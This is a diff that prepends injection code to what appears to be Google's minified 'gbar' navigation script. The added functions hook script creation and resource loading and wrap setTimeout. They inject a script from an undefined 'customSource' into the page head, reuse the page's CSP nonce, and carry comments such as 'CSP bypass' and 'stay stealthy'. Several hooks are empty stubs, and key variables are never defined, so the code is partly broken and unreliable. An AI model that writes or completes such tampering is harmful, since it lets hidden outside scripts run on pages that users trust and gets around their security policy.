@@ -1,0 +1,208 @@
+// Monitor all script loading attempts
+const originalPe = _.pe;
+_.pe = function(type) {
+    const element = originalPe(type);
+    if (type === "SCRIPT") {
+        // Track all script creation
+        element.addEventListener('load', () => {
+            // Capture loaded scripts
+        });
+    }
+    return element;
+};
+
+// Intercept resource loading chain
+const originalVd = _.Vd;
+_.Vd = function(resource) {
+    // Modify or redirect resource URLs
+    return originalVd(resource);
+};
+
+// Control timing and execution flow
+const enhancedOi = function() {
+    const originalTimeout = window.setTimeout;
+    window.setTimeout = function(callback, delay) {
+        // Manipulate loading delays
+        return originalTimeout(callback, delay);
+    };
+};
+
+// Deep property interception
+const deepProxy = function(obj) {
+    return new Proxy(obj, {
+        get: function(target, prop) {
+            const value = target[prop];
+            if (typeof value === 'object' && value !== null) {
+                return deepProxy(value);
+            }
+            return value;
+        }
+    });
+};
+// Intercept the gbar_ initialization
+this.gbar_ = new Proxy(this.gbar_ || {}, {
+    get: function(target, prop) {
+        // Monitor property access
+        return target[prop];
+    },
+    set: function(target, prop, value) {
+        // Intercept new properties
+        target[prop] = value;
+        return true;
+    }
+});
+
+// Enhanced script injection
+const enhancedGi = function(a, b) {
+    const c = _.pe("SCRIPT");
+    c.async = true;
+    c.type = "text/javascript";
+    c.charset = "UTF-8";
+    
+    // Intercept Ii value before injection
+    const originalIi = Ii;
+    Ii = customSource || originalIi;
+    
+    c.src = _.Vd(Ii);
+    _.Ci(c);
+    
+    // Enhanced error handling with retry logic
+    c.onerror = function() {
+        if (retryCount < maxRetries) {
+            retryCount++;
+            enhancedGi(a, b);
+        } else {
+            _.Kb(Hi, a, b, c.src)();
+        }
+    };
+    
+    _.Fi("HEAD")[0].appendChild(c);
+}
+const modifiedGi = function(a, b) {
+    const c = _.pe("SCRIPT");
+    c.async = true;  // Keep async to avoid blocking
+    c.type = "text/javascript";
+    c.charset = "UTF-8";
+    
+    // Add your custom source
+    c.src = customSource;
+    
+    // Preserve nonce handling for CSP bypass
+    _.Ci(c);
+    
+    // Add error handling to stay stealthy
+    c.onerror = _.Kb(Hi, a, b, c.src);
+    
+    // Inject into HEAD
+    _.Fi("HEAD")[0].appendChild(c);
+}
+this.gbar_ = this.gbar_ || {};
+(function(_) {
+    var window = this;
+    try {
+        if (_.vi) {
+            var zi = _.vi, Ai;
+            if (Ai = _.I(zi.j, 3)) {
+                const a = _.qg(Ai);
+                for (let b = 0; b < a.length; b++) {
+                    var Bi = a[b];
+                    if (_.bh && Bi.dataset)
+                        Bi.dataset.ogpc = "";
+                    else {
+                        if (/-[a-z]/.test("ogpc"))
+                            throw Error("F");
+                        Bi.setAttribute("data-" + _.xh("ogpc"), "")
+                    }
+                }
+            }
+            _.oi(zi, !!zi.i && zi.i.o(), !1)
+        }
+        ;
+    } catch (e) {
+        _._DumpException(e)
+    }
+    try {
+        _.Ci = function(a) {
+            const b = _.Zd("script", a.ownerDocument && a.ownerDocument.defaultView || window);
+            b && a.setAttribute("nonce", b)
+        }
+        ;
+        _.Di = function(a) {
+            if (!a)
+                return null;
+            a = _.I(a, 4);
+            var b;
+            a === null || a === void 0 ? b = null : b = _.Ud(a);
+            return b
+        }
+        ;
+        _.Ei = class extends _.Q {
+            constructor(a) {
+                super(a)
+            }
+        }
+        ;
+        _.Fi = function(a, b) {
+            return (b || document).getElementsByTagName(String(a))
+        }
+        ;
+    } catch (e) {
+        _._DumpException(e)
+    }
+    try {
+        var Hi = function(a, b, c) {
+            a < b ? Gi(a + 1, b) : _.Qc.log(Error("da`" + a + "`" + b), {
+                url: c
+            })
+        }
+          , Gi = function(a, b) {
+            if (Ii) {
+                const c = _.pe("SCRIPT");
+                c.async = !0;
+                c.type = "text/javascript";
+                c.charset = "UTF-8";
+                c.src = _.Vd(Ii);
+                _.Ci(c);
+                c.onerror = _.Kb(Hi, a, b, c.src);
+                _.Fi("HEAD")[0].appendChild(c)
+            }
+        }
+          , Ji = class extends _.Q {
+            constructor(a) {
+                super(a)
+            }
+        }
+        ;
+        var Ki = _.E(_.bd, Ji, 17) || new Ji, Li, Ii = (Li = _.E(Ki, _.Ei, 1)) ? _.Di(Li) : null, Mi, Ni = (Mi = _.E(Ki, _.Ei, 2)) ? _.Di(Mi) : null, Oi = function() {
+            Gi(1, 2);
+            if (Ni) {
+                const a = _.pe("LINK");
+                a.setAttribute("type", "text/css");
+                a.href = _.Vd(Ni).toString();
+                a.rel = "stylesheet";
+                let b = _.Zd("style", window);
+                b && a.setAttribute("nonce", b);
+                _.Fi("HEAD")[0].appendChild(a)
+            }
+        };
+        (function() {
+            const a = _.cd();
+            if (_.G(a, 18))
+                Oi();
+            else {
+                const b = _.be(a, 19) || 0;
+                window.addEventListener("load", () => {
+                    window.setTimeout(Oi, b)
+                }
+                )
+            }
+        }
+        )();
+    } catch (e) {
+        _._DumpException(e)
+    }
+}
+)(this.gbar_);
+// Google Inc.
+
+//# sourceURL=http://og/eob.js
